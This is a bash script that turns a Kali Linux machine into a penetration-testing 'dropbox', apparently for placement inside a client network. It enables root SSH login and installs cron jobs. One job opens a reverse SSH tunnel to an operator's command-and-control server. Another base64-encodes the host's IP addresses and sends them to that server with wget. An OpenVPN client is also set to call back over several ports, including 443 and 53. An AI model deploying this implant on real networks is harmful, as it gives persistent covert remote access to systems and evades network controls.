#!/bin/bash
# Config and install for the Kali dropbox
#echo 1 > /proc/sys/net/ipv4/ip_forward
#iptables -t nat -A POSTROUTING -d <TARGET NETWORK> -o eth0 -j MASQUERADE
#iptables-save
#/sbin/iptables-save > /etc/iptables/rules
# Make sure to set a root password 

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

echo "[+] Executing this will create a dropbox that will callback to the VPN press ENTER to continue"
read INPUT
echo "[+] Configuring SSH config"
sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/g" /etc/ssh/sshd_config
sed -i "s/#PubkeyAuthentication yes/PubkeyAuthentication yes/g" /etc/ssh/sshd_config
echo "AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2" >> /etc/ssh/sshd_config
echo "[+] Starting SSH"
systemctl start ssh
systemctl enable ssh
echo "[+] Updating Kali and tools"
apt install openvpn -y
apt update -y
apt upgrade -y
nmap --script-updatedb
echo "[+] Setup Metasploit DB"
msfdb init
msfconsole -x "db_rebuild_cache;exit"
echo "[+] Fixing the worst text editor ever"
echo ':set mouse=v' > ~/.vimrc
touch /root/phonehome.sh
echo "Enter the IP of the remote OpenVPN Server (CNC)> "
read cncServer
echo '#!/bin/bash' > /root/phonehome.sh
echo "createTunnel() {" >> /root/phonehome.sh
echo "    /usr/bin/ssh -o \"StrictHostKeyChecking=no\" -o \"StreamLocalBindUnlink=yes\" -i /root/.ssh/callback -N -R 2222:localhost:22 callback@$cncServer" >> /root/phonehome.sh
echo '    if [[ $? -eq 0 ]]; then' >> /root/phonehome.sh
echo "        echo \"Tunnel to jumpbox created successfully\"" >> /root/phonehome.sh
echo "    else" >> /root/phonehome.sh
echo "        echo \"[!] error occurred creating a tunnel to jumpbox\"" >> /root/phonehome.sh
echo "    fi" >> /root/phonehome.sh
echo "}" >> /root/phonehome.sh
echo "/bin/pidof ssh" >> /root/phonehome.sh
echo 'if [[ $? -ne 0 ]]; then' >> /root/phonehome.sh
echo "    echo \"[+] creating new tunnel connection\"" >> /root/phonehome.sh
echo "    createTunnel" >> /root/phonehome.sh
echo "fi" >> /root/phonehome.sh
touch /root/beacon.sh
echo "#!/bin/sh" > /root/beacon.sh
echo "SERVER=\"$cncServer\"" >> /root/beacon.sh
echo "IPINFO=\`ifconfig | awk '/inet/{print \$2}' | cut -d: -f2 |base64\`" >> /root/beacon.sh
echo 'wget -T1 -q http://$SERVER/$IPINFO' >> /root/beacon.sh
echo 'wget -T1 -q https://$SERVER/$IPINFO' >> /root/beacon.sh
echo 'wget -T1 -q http://$SERVER:53/$IPINFO' >> /root/beacon.sh
touch /root/ipTables.sh
echo "#!/bin/bash" > /root/ipTables.sh
echo "iptables -t nat -A POSTROUTING -d <TARGET_NETWORK> -o <INTERFACE> -j MASQUERADE" >> /root/ipTables.sh
echo "iptables-save" >> /root/ipTables.sh
echo "[+] Making new scripts executable"
chmod +x /root/{beacon,phonehome,ipTables}.sh
# https://stackoverflow.com/questions/878600/how-to-create-a-cron-job-using-bash-automatically-without-the-interactive-editor
crontab -l > mycron
echo "PATH=/usr/sbin:/sbin:/usr/bin:/bin" > mycron
#echo "*/5 * * * * root /root/beacon.sh 2>&1" >> mycron
#echo "*/1 * * * * root /root/phonehome.sh 2>&1" >> mycron
echo "*/5 * * * * /root/beacon.sh 2>&1" >> mycron
echo "*/1 * * * * /root/phonehome.sh 2>&1" >> mycron
echo "@reboot /root/ipTables.sh 2>&1" >> mycron
crontab mycron
rm mycron
ssh-keygen -b 2048 -t rsa -f /root/.ssh/callback -q -N ""
echo "Copy the callback.pub key to the authorized_keys on $cncServer user callback"
echo "Enter the name of the customer (acmeCorp)"
read clientName
touch /etc/openvpn/pttunnel.conf
echo "client" > /etc/openvpn/pttunnel.conf
echo "dev tun" >> /etc/openvpn/pttunnel.conf
echo "#tls-remote vpn01" >> /etc/openvpn/pttunnel.conf
echo "proto tcp" >> /etc/openvpn/pttunnel.conf
echo "remote $cncServer 1194" >> /etc/openvpn/pttunnel.conf
echo "remote $cncServer 443" >> /etc/openvpn/pttunnel.conf
echo "remote $cncServer 8080" >> /etc/openvpn/pttunnel.conf
echo "remote $cncServer 53" >> /etc/openvpn/pttunnel.conf
echo "dev tun" >> /etc/openvpn/pttunnel.conf
echo "persist-key" >> /etc/openvpn/pttunnel.conf
echo "persist-tun" >> /etc/openvpn/pttunnel.conf
echo "verb 3" >> /etc/openvpn/pttunnel.conf
echo "remote-cert-tls server" >> /etc/openvpn/pttunnel.conf
echo "ca /etc/openvpn/ca.crt" >> /etc/openvpn/pttunnel.conf
echo "cert /etc/openvpn/$clientName.crt" >> /etc/openvpn/pttunnel.conf
echo "key /etc/openvpn/$clientName.key" >> /etc/openvpn/pttunnel.conf
echo "cipher AES-256-CBC" >> /etc/openvpn/pttunnel.conf
echo "comp-lzo" >> /etc/openvpn/pttunnel.conf
systemctl enable openvpn
openvpn --config /etc/openvpn/pttunnel.conf
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target